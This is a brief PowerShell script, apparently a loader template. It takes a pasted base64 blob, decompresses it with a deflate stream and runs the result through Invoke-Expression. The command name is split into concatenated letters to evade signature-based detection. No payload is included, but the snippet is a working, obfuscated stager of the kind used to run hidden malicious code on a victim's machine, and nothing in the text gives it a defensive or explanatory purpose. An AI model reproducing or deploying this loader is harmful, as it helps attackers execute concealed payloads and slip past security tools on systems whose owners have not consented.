$e='PASTE-YOUR-BASE64-HERE'
$d=[System.Convert]::FromBase64String($e)
$m=New-Object IO.MemoryStream(,$d)
$z=New-Object IO.Compression.DeflateStream($m,[IO.Compression.CompressionMode]::Decompress)
$b2=New-Object byte[] 5000
$o=New-Object IO.MemoryStream
while(($r=$z.Read($b2,0,$b2.Length))-ne 0){$o.Write($b2,0,$r)}
$z.Close();$m.Close()
$p=[System.Text.Encoding]::Unicode.GetString($o.ToArray())
$iex=('I'+'e'+'x')
&$iex $p
